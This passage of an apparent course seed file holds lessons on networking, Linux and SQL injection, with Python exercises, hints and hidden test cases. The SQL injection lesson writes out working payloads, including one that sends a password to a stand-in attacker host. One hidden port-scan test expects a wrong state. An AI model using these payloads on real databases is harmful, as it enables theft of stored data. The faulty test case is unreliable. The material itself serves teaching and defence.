| 7 | Application | HTTP, FTP, SMTP | User-facing services |
| 6 | Presentation | SSL/TLS, JPEG | Data formatting, encryption |
| 5 | Session | NetBIOS, RPC | Manages sessions |
| 4 | Transport | TCP, UDP | Reliable/unreliable delivery |
| 3 | Network | IP, ICMP | Routing between networks |
| 2 | Data Link | Ethernet, ARP | Frame delivery on local network |
| 1 | Physical | Cables, Wi-Fi | Raw bit transmission |

In practice, we often simplify to the **TCP/IP model** with 4 layers: Application, Transport, Internet, Network Access.

## TCP: Reliable Delivery

**Transmission Control Protocol (TCP)** provides reliable, ordered, error-checked delivery:

1. **Three-way handshake**: SYN → SYN-ACK → ACK
2. **Data transfer**: Sequenced packets with acknowledgments
3. **Connection teardown**: FIN → FIN-ACK → ACK

### TCP Flags

| Flag | Meaning |
|------|---------|
| SYN | Synchronize (start connection) |
| ACK | Acknowledge received data |
| FIN | Finish (close connection) |
| RST | Reset (abort connection) |
| PSH | Push (send data immediately) |
| URG | Urgent (priority data) |

## UDP: Fast but Unreliable

**User Datagram Protocol (UDP)** trades reliability for speed:
- No handshake, no acknowledgment, no ordering
- Used for DNS, DHCP, streaming, gaming
- Attackers love UDP for **amplification attacks** (small request → large response)

## Common Ports

| Port | Service | Security Relevance |
|------|---------|--------------------|
| 22 | SSH | Brute force target |
| 80 | HTTP | Web attacks |
| 443 | HTTPS | TLS attacks |
| 53 | DNS | DNS spoofing, amplification |
| 3306 | MySQL | Database attacks |
| 8080 | HTTP Proxy | Alternative web port |

## DNS: The Internet Phonebook

**Domain Name System (DNS)** translates domain names to IP addresses:

\`\`\`
User types "example.com" → DNS resolver → IP address 93.184.216.34
\`\`\`

DNS attacks include:
- **DNS spoofing/poisoning**: Returning fake IP addresses
- **DNS tunneling**: Exfiltrating data through DNS queries
- **DNS amplification**: Using open DNS resolvers for DDoS

## HTTP: The Web Protocol

**Hypertext Transfer Protocol (HTTP)** defines how web clients and servers communicate:

\`\`\`
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
\`\`\`

Key HTTP methods: GET (retrieve), POST (create), PUT (update), DELETE (remove).

Understanding these protocols at a deep level is what separates script kiddies from security professionals. When you can read a packet capture like a book, you are ready for network security.`,
    order: 2,
    xpReward: 60,
    category: 'cyber',
    exercises: [
      {
        title: 'Port Scanner',
        slug: 'port-scanner',
        description: 'Write a function `parse_port_scan(scan_output)` that parses a simulated port scan output string. The input is a multi-line string where each open port line follows the format: `"PORT/SERVICE STATE"`, e.g., `"22/tcp open"`. Return a list of dictionaries, each with keys `"port"`, `"protocol"`, and `"state"`, sorted by port number.',
        starterCode: `def parse_port_scan(scan_output):
    # Parse port scan output and return list of dicts
    # Each line: "PORT/PROTOCOL STATE"
    # Return: [{"port": 22, "protocol": "tcp", "state": "open"}, ...]
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the input by newlines. For each line, split by whitespace. Parse the first token by splitting on "/" to get port and protocol. The second token is the state.', xpCost: 5 },
          { level: 2, content: 'For each line: `parts = line.split()`, then `port_proto = parts[0].split("/")`, then `{"port": int(port_proto[0]), "protocol": port_proto[1], "state": parts[1]}`. Filter out empty lines and lines that do not match the format.', xpCost: 10 },
          { level: 3, content: 'Complete: split by newlines, skip lines without "/" in first token, parse each valid line, collect dicts, sort by port, return list.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_port_scan("22/tcp open\\n80/tcp open\\n443/tcp open")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'open'}, {'port': 80, 'protocol': 'tcp', 'state': 'open'}, {'port': 443, 'protocol': 'tcp', 'state': 'open'}]", isHidden: false, order: 1 },
          { input: 'parse_port_scan("8080/tcp open\\n22/tcp open")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'open'}, {'port': 8080, 'protocol': 'tcp', 'state': 'open'}]", isHidden: false, order: 2 },
          { input: 'parse_port_scan("53/udp open\\n22/tcp open\\n80/tcp closed")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'closed'}, {'port': 53, 'protocol': 'udp', 'state': 'open'}, {'port': 80, 'protocol': 'tcp', 'state': 'closed'}]", isHidden: true, order: 3 },
          { input: 'parse_port_scan("3306/tcp open")', expectedOutput: "[{'port': 3306, 'protocol': 'tcp', 'state': 'open'}]", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Subnet Calculator',
        slug: 'subnet-calculator',
        description: 'Write a function `network_address(ip, mask)` that takes an IP address string and a subnet mask string (both in dotted decimal like "192.168.1.10" and "255.255.255.0"), and returns the network address as a string. The network address is computed by bitwise AND of the IP and mask octets.',
        starterCode: `def network_address(ip, mask):
    # Calculate network address from IP and subnet mask
    pass`,
        language: 'python',
        order: 2,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split both IP and mask by ".". Convert each octet to int. AND corresponding octets. Join back with ".".', xpCost: 5 },
          { level: 2, content: '`ip_parts = [int(x) for x in ip.split(".")]`, `mask_parts = [int(x) for x in mask.split(".")]`. Then: `".".join(str(i & m) for i, m in zip(ip_parts, mask_parts))`', xpCost: 10 },
          { level: 3, content: 'Complete: `def network_address(ip, mask): return ".".join(str(int(a)&int(b)) for a,b in zip(ip.split("."), mask.split(".")))`', xpCost: 20 },
        ],
        testCases: [
          { input: 'network_address("192.168.1.10", "255.255.255.0")', expectedOutput: '192.168.1.0', isHidden: false, order: 1 },
          { input: 'network_address("10.0.0.5", "255.0.0.0")', expectedOutput: '10.0.0.0', isHidden: false, order: 2 },
          { input: 'network_address("172.16.5.100", "255.255.0.0")', expectedOutput: '172.16.0.0', isHidden: true, order: 3 },
          { input: 'network_address("192.168.1.255", "255.255.255.0")', expectedOutput: '192.168.1.0', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'HTTP Request Parser',
        slug: 'http-request-parser',
        description: 'Write a function `parse_http_request(request)` that takes an HTTP request string and returns a dict with keys `"method"`, `"path"`, and `"host"`. The first line is the request line (`METHOD PATH HTTP/version`). The `Host` header line contains the host. For example, `parse_http_request("GET /index.html HTTP/1.1\\nHost: example.com")` returns `{"method": "GET", "path": "/index.html", "host": "example.com"}`.',
        starterCode: `def parse_http_request(request):
    # Parse HTTP request into method, path, and host
    pass`,
        language: 'python',
        order: 3,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the request by newlines. The first line contains method and path (space-separated). Find the line starting with "Host:" and extract the value.', xpCost: 5 },
          { level: 2, content: 'Parse request line: `parts = lines[0].split()`, method=parts[0], path=parts[1]. Find Host: iterate lines, split by ": ", check if first part is "Host".', xpCost: 10 },
          { level: 3, content: 'Complete: split by newlines, parse first line for method and path, iterate remaining lines for Host header.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_http_request("GET /index.html HTTP/1.1\\nHost: example.com")', expectedOutput: "{'method': 'GET', 'path': '/index.html', 'host': 'example.com'}", isHidden: false, order: 1 },
          { input: 'parse_http_request("POST /api/data HTTP/1.1\\nHost: api.example.com\\nContent-Type: application/json")', expectedOutput: "{'method': 'POST', 'path': '/api/data', 'host': 'api.example.com'}", isHidden: false, order: 2 },
          { input: 'parse_http_request("DELETE /users/42 HTTP/1.1\\nHost: localhost:3000")', expectedOutput: "{'method': 'DELETE', 'path': '/users/42', 'host': 'localhost:3000'}", isHidden: true, order: 3 },
          { input: 'parse_http_request("PUT /update HTTP/1.1\\nHost: test.com\\nAuth: Bearer xyz")', expectedOutput: "{'method': 'PUT', 'path': '/update', 'host': 'test.com'}", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'IP Address Validator',
        slug: 'ip-address-validator',
        description: 'Write a function `is_valid_ip(ip)` that takes a string and returns `True` if it is a valid IPv4 address, `False` otherwise. A valid IPv4 address has exactly 4 octets separated by dots, each octet is a number from 0 to 255 with no leading zeros (except "0" itself). For example, `is_valid_ip("192.168.1.1")` returns `True`, `is_valid_ip("256.1.1.1")` returns `False`.',
        starterCode: `def is_valid_ip(ip):
    # Return True if ip is a valid IPv4 address
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split by "." and check: exactly 4 parts, each is numeric, between 0-255, no leading zeros (except "0").', xpCost: 5 },
          { level: 2, content: 'Split: `parts = ip.split(".")`. Check len(parts)==4. For each part: `if not part.isdigit(): return False`, `if len(part) > 1 and part[0] == "0": return False`, `if not 0 <= int(part) <= 255: return False`.', xpCost: 10 },
          { level: 3, content: 'Complete: validate 4 octets, numeric, no leading zeros, range 0-255.', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_valid_ip("192.168.1.1")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_valid_ip("256.1.1.1")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_valid_ip("01.2.3.4")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'is_valid_ip("0.0.0.0")', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'is_valid_ip("1.2.3")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'CIDR Notation Parser',
        slug: 'cidr-notation-parser',
        description: 'Write a function `parse_cidr(cidr)` that takes a CIDR notation string like `"192.168.1.0/24"` and returns a dict with keys `"network"`, `"mask"`, and `"prefix"`. The network is the network address (IP AND mask), the mask is the subnet mask in dotted decimal, and the prefix is the integer after the slash. For example, `parse_cidr("192.168.1.0/24")` returns `{"network": "192.168.1.0", "mask": "255.255.255.0", "prefix": 24}`.',
        starterCode: `def parse_cidr(cidr):
    # Parse CIDR notation and return network, mask, and prefix
    pass`,
        language: 'python',
        order: 5,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Split on "/" to get IP and prefix. Convert prefix to subnet mask: prefix number of 1-bits followed by 0-bits, split into 4 octets. Compute network address by ANDing IP octets with mask octets.', xpCost: 5 },
          { level: 2, content: 'Build mask: `mask_int = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF`. Convert to dotted decimal: `".".join(str((mask_int >> i) & 0xFF) for i in [24, 16, 8, 0])`. Network: AND corresponding octets of IP and mask.', xpCost: 10 },
          { level: 3, content: 'Complete: parse the CIDR string, compute the full subnet mask from the prefix length, AND the IP with the mask to get the network address.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_cidr("192.168.1.0/24")', expectedOutput: "{'network': '192.168.1.0', 'mask': '255.255.255.0', 'prefix': 24}", isHidden: false, order: 1 },
          { input: 'parse_cidr("10.0.0.0/8")', expectedOutput: "{'network': '10.0.0.0', 'mask': '255.0.0.0', 'prefix': 8}", isHidden: false, order: 2 },
          { input: 'parse_cidr("172.16.0.0/16")', expectedOutput: "{'network': '172.16.0.0', 'mask': '255.255.0.0', 'prefix': 16}", isHidden: true, order: 3 },
          { input: 'parse_cidr("192.168.1.100/24")', expectedOutput: "{'network': '192.168.1.0', 'mask': '255.255.255.0', 'prefix': 24}", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // Lesson 3.3: Linux & Command Line
  const lesson3_3 = await createLessonWithExercises(phases[2].id, {
    title: 'Linux & Command Line',
    slug: 'linux-and-command-line',
    description: 'Master the Linux command line — the primary tool for cybersecurity professionals, system administrators, and developers working with servers.',
    contentMdx: `# Linux & Command Line

Linux is the dominant operating system in cybersecurity. The majority of servers, security tools, and CTF environments run on Linux. Fluency with the command line is not optional — it is a requirement.

## Why Linux for Security?

- **Open source**: You can inspect, modify, and audit every line of code
- **Tool ecosystem**: Kali Linux, Parrot OS, and BlackArch provide thousands of security tools
- **Server dominance**: Over 90% of cloud infrastructure runs Linux
- **Control**: Granular permissions, scripting, and automation capabilities

## Essential Commands

### Navigation & File Operations

| Command | Purpose | Example |
|---------|---------|---------|
| \`ls\` | List directory contents | \`ls -la /\` |
| \`cd\` | Change directory | \`cd /var/log\` |
| \`pwd\` | Print working directory | \`pwd\` |
| \`cat\` | Display file contents | \`cat /etc/passwd\` |
| \`grep\` | Search text patterns | \`grep "error" /var/log/syslog\` |
| \`find\` | Find files | \`find / -name "*.conf"\` |
| \`chmod\` | Change permissions | \`chmod 600 secret.key\` |
| \`chown\` | Change ownership | \`chown root:root /etc/shadow\` |

### Process & Network

| Command | Purpose | Example |
|---------|---------|---------|
| \`ps\` | List processes | \`ps aux\` |
| \`top\` | Monitor processes | \`top\` |
| \`netstat\` | Network connections | \`netstat -tlnp\` |
| \`ss\` | Socket statistics | \`ss -tlnp\` |
| \`curl\` | HTTP requests | \`curl -v https://target.com\` |

## File Permissions

Linux uses a three-tier permission model:

\`\`\`
-rw-r--r-- 1 alice developers 4096 Jan 15 10:30 notes.txt
│├──┤├──┤├──┤
│ │   │   └── Others: read only
│ │   └────── Group: read only
│ └────────── Owner: read + write
└───────────── Type: regular file (-), directory (d), link (l)
\`\`\`

Permission values: read (4) + write (2) + execute (1). So \`chmod 755\` means:
- Owner: 7 (4+2+1 = rwx)
- Group: 5 (4+1 = r-x)
- Others: 5 (4+1 = r-x)

## Log Analysis

System logs are your primary forensic evidence:

\`\`\`bash
# Apache access log example
192.168.1.100 - - [15/Jan/2024:10:30:45 +0000] "GET /admin HTTP/1.1" 403 289
192.168.1.100 - - [15/Jan/2024:10:30:46 +0000] "GET /admin HTTP/1.1" 403 289
192.168.1.100 - - [15/Jan/2024:10:30:47 +0000] "POST /login HTTP/1.1" 401 145
\`\`\`

Suspicious patterns include:
- Repeated 403/401 responses (brute force attempts)
- Requests for \`/etc/passwd\` or \`/wp-admin\` (probing)
- Unusual HTTP methods (PUT, DELETE on read-only endpoints)
- Requests at unusual hours

## Scripting

Bash and Python scripts automate repetitive security tasks:

\`\`\`python
#!/usr/bin/env python3
# Simple log parser for suspicious activity
import re

with open("/var/log/apache2/access.log") as f:
    for line in f:
        if re.search(r' (403|401) ', line):
            ip = line.split()[0]
            print(f"Suspicious activity from {ip}")
\`\`\`

Master the command line, and you will work faster, investigate deeper, and automate the tedious parts of security analysis.`,
    order: 3,
    xpReward: 60,
    category: 'cyber',
    exercises: [
      {
        title: 'Log Parser',
        slug: 'log-parser',
        description: 'Write a function `parse_access_log(log_lines)` that takes a list of Apache access log strings and returns a list of IPs that have more than 3 failed requests (status codes 401 or 403). Each log line format: `IP - - [timestamp] "METHOD PATH HTTP/version" STATUS SIZE`.',
        starterCode: `def parse_access_log(log_lines):
    # Return list of IPs with more than 3 failed requests (status 401 or 403)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'For each line, extract the IP (first token) and the status code (second-to-last token). Count failed requests per IP. Return IPs where count > 3.', xpCost: 5 },
          { level: 2, content: 'Use a dictionary to track failed counts per IP. For each line: `parts = line.split()`, ip = parts[0], status = parts[-2]. If status in ("401", "403"): increment count for that IP. Return [ip for ip, count in dict.items() if count > 3].', xpCost: 10 },
          { level: 3, content: 'Complete: `def parse_access_log(log_lines): failed = {}; [failed.__setitem__(p[0], failed.get(p[0],0)+1) for l in log_lines if (p:=l.split()) and p[-2] in ("401","403")]; return [ip for ip,c in failed.items() if c > 3]` — but use a readable loop approach.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_access_log(["10.0.0.1 - - [date] \\"GET /admin HTTP/1.1\\" 403 100", "10.0.0.1 - - [date] \\"POST /login HTTP/1.1\\" 401 100", "10.0.0.1 - - [date] \\"GET /secret HTTP/1.1\\" 403 100", "10.0.0.1 - - [date] \\"POST /login HTTP/1.1\\" 401 100", "10.0.0.2 - - [date] \\"GET /home HTTP/1.1\\" 200 500"])', expectedOutput: "['10.0.0.1']", isHidden: false, order: 1 },
          { input: 'parse_access_log(["10.0.0.1 - - [d] \\"GET / HTTP/1.1\\" 403 1", "10.0.0.1 - - [d] \\"GET / HTTP/1.1\\" 403 1", "10.0.0.2 - - [d] \\"GET / HTTP/1.1\\" 200 1"])', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'parse_access_log(["10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 200 1"])', expectedOutput: "['10.0.0.5']", isHidden: true, order: 3 },
        ],
      },
      {
        title: 'Permission Encoder',
        slug: 'permission-encoder',
        description: 'Write a function `encode_permissions(owner, group, others)` that takes three strings of permissions (like `"rwx"`, `"r-x"`, `"r--"`) and returns the octal permission number as a string. Each permission string maps to: r=4, w=2, x=1, sum them. For example, `encode_permissions("rwx", "r-x", "r--")` returns `"754"`.',
        starterCode: `def encode_permissions(owner, group, others):
    # Convert symbolic permissions to octal notation
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'For each permission string, sum the values: r=4, w=2, x=1. If a position has "-" it contributes 0. Then concatenate the three digits.', xpCost: 5 },
          { level: 2, content: 'Define a helper: `def perm_val(p): return (4 if "r" in p else 0) + (2 if "w" in p else 0) + (1 if "x" in p else 0)`. Return `str(perm_val(owner)) + str(perm_val(group)) + str(perm_val(others))`.', xpCost: 10 },
          { level: 3, content: 'Complete: map each string to its numeric value by checking r/w/x membership, concatenate as string.', xpCost: 20 },
        ],
        testCases: [
          { input: 'encode_permissions("rwx", "r-x", "r--")', expectedOutput: '754', isHidden: false, order: 1 },
          { input: 'encode_permissions("rwx", "rwx", "rwx")', expectedOutput: '777', isHidden: false, order: 2 },
          { input: 'encode_permissions("rw-", "r--", "r--")', expectedOutput: '644', isHidden: true, order: 3 },
          { input: 'encode_permissions("rw-", "---", "---")', expectedOutput: '600', isHidden: true, order: 4 },
          { input: 'encode_permissions("r--", "r--", "---")', expectedOutput: '440', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Grep Simulator',
        slug: 'grep-simulator',
        description: 'Write a function `simple_grep(lines, pattern)` that takes a list of strings and a pattern string, and returns a list of lines that contain the pattern (case-sensitive). For example, `simple_grep(["hello world", "foo bar", "hello there"], "hello")` returns `["hello world", "hello there"]`.',
        starterCode: `def simple_grep(lines, pattern):
    # Return lines containing the pattern
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use a list comprehension to filter lines where `pattern in line`.', xpCost: 5 },
          { level: 2, content: 'Return `[line for line in lines if pattern in line]`', xpCost: 10 },
          { level: 3, content: 'Complete: `def simple_grep(lines, pattern): return [line for line in lines if pattern in line]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'simple_grep(["hello world", "foo bar", "hello there"], "hello")', expectedOutput: "['hello world', 'hello there']", isHidden: false, order: 1 },
          { input: 'simple_grep(["abc", "def", "ghi"], "x")', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'simple_grep(["error: disk full", "info: started", "error: timeout"], "error")', expectedOutput: "['error: disk full', 'error: timeout']", isHidden: true, order: 3 },
          { input: 'simple_grep(["Line1", "line2", "LINE1"], "Line")', expectedOutput: "['Line1', 'LINE1']", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Path Resolver',
        slug: 'path-resolver',
        description: 'Write a function `resolve_path(path)` that takes a Unix-style file path and returns the simplified canonical path. Handle: multiple slashes (reduce to one), `.` (current directory, remove), `..` (parent directory, go up one level). For example, `resolve_path("/home/user/../admin/./docs")` returns `"/home/admin/docs"`.',
        starterCode: `def resolve_path(path):
    # Simplify a Unix path by resolving . and .. and multiple slashes
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the path by "/". Use a stack: for each component, skip empty strings and ".", pop for "..", push otherwise. Join with "/" and prepend "/".', xpCost: 5 },
          { level: 2, content: 'Split: `parts = path.split("/")`. Stack = []. For each part: if part == "" or part == ".": continue; if part == "..": if stack: stack.pop(); else: stack.append(part). Return "/" + "/".join(stack).', xpCost: 10 },
          { level: 3, content: 'Complete: split by "/", use a stack to resolve relative components, rejoin with leading slash.', xpCost: 20 },
        ],
        testCases: [
          { input: 'resolve_path("/home/user/../admin/./docs")', expectedOutput: '/home/admin/docs', isHidden: false, order: 1 },
          { input: 'resolve_path("/a/b/c")', expectedOutput: '/a/b/c', isHidden: false, order: 2 },
          { input: 'resolve_path("/a/../../b")', expectedOutput: '/b', isHidden: true, order: 3 },
          { input: 'resolve_path("/../")', expectedOutput: '/', isHidden: true, order: 4 },
          { input: 'resolve_path("/home//user/")', expectedOutput: '/home/user', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Command Pipeline Simulator',
        slug: 'command-pipeline-simulator',
        description: 'Write a function `simulate_pipeline(data, commands)` that takes a list of strings (data lines) and a list of command dicts, and applies them sequentially. Each command has `"op"`: `"filter"` (keep lines containing `value`), `"sort"` (sort lines), or `"head"` (keep first N lines from `value`). Return the final list. For example, `simulate_pipeline(["error: disk", "info: started", "error: timeout"], [{"op": "filter", "value": "error"}, {"op": "sort"}])` returns `["error: disk", "error: timeout"]`.',
        starterCode: `def simulate_pipeline(data, commands):
    # Apply a sequence of commands to data lines
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Start with result = list(data). For each command: if op is "filter", keep only lines containing value; if "sort", sort the list; if "head", keep first value lines.', xpCost: 5 },
          { level: 2, content: 'Loop through commands: `if cmd["op"] == "filter": result = [l for l in result if cmd["value"] in l]`, `elif cmd["op"] == "sort": result.sort()`, `elif cmd["op"] == "head": result = result[:cmd["value"]]`.', xpCost: 10 },
          { level: 3, content: 'Complete: apply each command in sequence, updating the result list each time.', xpCost: 20 },
        ],
        testCases: [
          { input: 'simulate_pipeline(["error: disk", "info: started", "error: timeout"], [{"op": "filter", "value": "error"}, {"op": "sort"}])', expectedOutput: "['error: disk', 'error: timeout']", isHidden: false, order: 1 },
          { input: 'simulate_pipeline(["c", "a", "b"], [{"op": "sort"}, {"op": "head", "value": 2}])', expectedOutput: "['a', 'b']", isHidden: false, order: 2 },
          { input: 'simulate_pipeline(["x1", "y1", "x2"], [{"op": "filter", "value": "x"}])', expectedOutput: "['x1', 'x2']", isHidden: true, order: 3 },
          { input: 'simulate_pipeline(["b", "a", "c"], [{"op": "sort"}, {"op": "head", "value": 1}])', expectedOutput: "['a']", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // ============================================================
  // PHASE 4: WEB SECURITY
  // ============================================================

  // Lesson 4.1: SQL Injection
  const lesson4_1 = await createLessonWithExercises(phases[3].id, {
    title: 'SQL Injection',
    slug: 'sql-injection',
    description: 'Learn about the most dangerous web vulnerability — SQL injection. Understand how attackers exploit it and how to write secure database queries.',
    contentMdx: `# SQL Injection

SQL Injection (SQLi) has been at or near the top of the OWASP Top 10 for over a decade. It allows attackers to execute arbitrary SQL commands on a database, potentially reading, modifying, or deleting all data. It is devastating, common, and entirely preventable.

## How SQL Injection Works

When an application constructs SQL queries by concatenating user input, an attacker can inject malicious SQL:

\`\`\`python
# VULNERABLE CODE — NEVER DO THIS
username = request.form["username"]
query = f"SELECT * FROM users WHERE username = '{username}'"
\`\`\`

If the attacker enters \`' OR '1'='1\`, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1'
\`\`\`

Since \`'1'='1'\` is always true, this returns **every row** in the users table!

## Types of SQL Injection

### 1. In-Band (Classic) SQLi

The attacker uses the same channel to inject and retrieve results:

\`\`\`
Input: ' UNION SELECT username, password FROM admins--
\`\`\`

The \`UNION\` operator appends a second SELECT query, leaking data from other tables.

### 2. Blind SQLi

The application does not return query results directly, but the attacker can infer information:

**Boolean-based**: Inject a condition and observe different responses:
\`\`\`
Input: ' AND 1=1-- (returns normal page)
Input: ' AND 1=2-- (returns different page → condition is injectable)
\`\`\`

**Time-based**: Use conditional delays to extract data bit by bit:
\`\`\`
Input: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
\`\`\`

### 3. Out-of-Band SQLi

The attacker exfiltrates data through a different channel (DNS, HTTP requests):
\`\`\`
Input: '; EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 password FROM users) + '.share'--
\`\`\`

## Prevention

### Parameterized Queries (Prepared Statements)

The gold standard defense — **always use parameterized queries**:

\`\`\`python
# SECURE CODE — ALWAYS DO THIS
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
\`\`\`

The database treats the parameter as **data**, not executable SQL — making injection impossible.

### Input Validation

Validate and sanitize all user input:
- Use **allowlists** (not blocklists) for expected input patterns
- Limit input length and character set
- Never trust client-side validation alone

### Least Privilege

Database accounts should have the minimum permissions needed:
- Application accounts should NOT be able to \`DROP TABLE\`
- Read-only accounts for queries that do not need writes
- Separate accounts for different operations

### Defense in Depth

Layer your defenses:
1. Parameterized queries (primary)
2. Input validation (secondary)
3. Web Application Firewall (WAF) (tertiary)
4. Database monitoring and alerting

SQL injection is the poster child for "easy to prevent, devastating when ignored." There is no excuse for vulnerable code in modern applications.`,
    order: 1,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'SQL Injection Detector',
        slug: 'sql-injection-detector',
        description: 'Write a function `detect_sqli(input_string)` that takes a string and returns `True` if it contains common SQL injection patterns, `False` otherwise. Detect: `\' OR`, `UNION SELECT`, `; DROP`, `--`, `1=1`, and `SLEEP(` (case-insensitive).',
        starterCode: `def detect_sqli(input_string):
    # Return True if input contains SQL injection patterns
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Convert the input to lowercase, then check if any of the known SQL injection pattern substrings are present: `"\' or"`, `"union select"`, `"; drop"`, `"--"`, `"1=1"`, `"sleep("`.', xpCost: 5 },
          { level: 2, content: 'Define a list of patterns: `patterns = ["\' or", "union select", "; drop", "--", "1=1", "sleep("]`. Then: `return any(p in input_string.lower() for p in patterns)`', xpCost: 10 },
          { level: 3, content: 'Complete: `def detect_sqli(s): s = s.lower(); return any(p in s for p in ["\\x27 or","union select","; drop","--","1=1","sleep("])`', xpCost: 20 },
        ],
        testCases: [
          { input: `detect_sqli("' OR 1=1--")`, expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'detect_sqli("normal user input")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'detect_sqli("1 UNION SELECT * FROM users")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: `detect_sqli("admin'; DROP TABLE users;--")`, expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'detect_sqli("Hello World")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Parameterize Query',
        slug: 'parameterize-query',
        description: 'Write a function `parameterize_query(query_template, params)` that takes a SQL query template with `?` placeholders and a list of parameter values, and returns the safe parameterized query string with properly escaped values. String values should be wrapped in single quotes with internal quotes escaped, numeric values left as-is. For example, `parameterize_query("SELECT * FROM users WHERE name = ? AND age = ?", ["Alice", 25])` returns `"SELECT * FROM users WHERE name = \'Alice\' AND age = 25"`.',
        starterCode: `def parameterize_query(query_template, params):
    # Replace ? placeholders with properly escaped values
    pass`,
        language: 'python',
        order: 2,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Iterate through params. For each: if it is a string, wrap in single quotes and escape internal single quotes by doubling them. If it is a number, use str(). Replace each ? in order.', xpCost: 5 },
          { level: 2, content: 'For each param: if isinstance(p, str): val = chr(39) + p.replace(chr(39), chr(39)+chr(39)) + chr(39) else val = str(p). Then replace the first ? with val in the template.', xpCost: 10 },
          { level: 3, content: 'Complete: iterate params, build escaped values, replace ? placeholders one at a time using str.replace with count=1.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parameterize_query("SELECT * FROM users WHERE name = ? AND age = ?", ["Alice", 25])', expectedOutput: "SELECT * FROM users WHERE name = 'Alice' AND age = 25", isHidden: false, order: 1 },
          { input: 'parameterize_query("SELECT * FROM users WHERE id = ?", [42])', expectedOutput: 'SELECT * FROM users WHERE id = 42', isHidden: false, order: 2 },
          { input: 'parameterize_query("INSERT INTO logs (msg) VALUES (?)", ["It\'s done"])', expectedOutput: "INSERT INTO logs (msg) VALUES ('It''s done')", isHidden: true, order: 3 },
          { input: 'parameterize_query("DELETE FROM temp WHERE id = ?", [0])', expectedOutput: 'DELETE FROM temp WHERE id = 0', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Input Sanitizer',
        slug: 'input-sanitizer',
        description: 'Write a function `sanitize_input(user_input)` that takes a string and returns a sanitized version safe for use in SQL queries. Remove/escape: single quotes (replace with double single quotes), semicolons (remove), and SQL keywords (SELECT, INSERT, UPDATE, DELETE, DROP, EXEC — case-insensitive, remove the whole word). For example, `sanitize_input("Alice; DROP TABLE users")` returns `"Alice  TABLE users"`.',
        starterCode: `import re

def sanitize_input(user_input):
    # Sanitize user input for safe SQL use
    pass`,
        language: 'python',
        order: 3,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Step 1: Replace single quotes with double single quotes. Step 2: Remove semicolons. Step 3: Remove SQL keywords (case-insensitive) as whole words using regex with word boundaries.', xpCost: 5 },
          { level: 2, content: 'Escape quotes: replace single quotes with two single quotes. Remove semicolons: replace ";" with "". Remove keywords: for each SQL keyword, use re.sub with IGNORECASE flag.', xpCost: 10 },
          { level: 3, content: 'Complete: apply escaping first, then removal of dangerous characters and keywords in sequence.', xpCost: 20 },
        ],
        testCases: [
          { input: 'sanitize_input("Alice; DROP TABLE users")', expectedOutput: "Alice  TABLE users", isHidden: false, order: 1 },
          { input: 'sanitize_input("normal_name")', expectedOutput: 'normal_name', isHidden: false, order: 2 },
          { input: 'sanitize_input("O\'Brien; DELETE FROM logs")', expectedOutput: "O''Brien  FROM logs", isHidden: true, order: 3 },
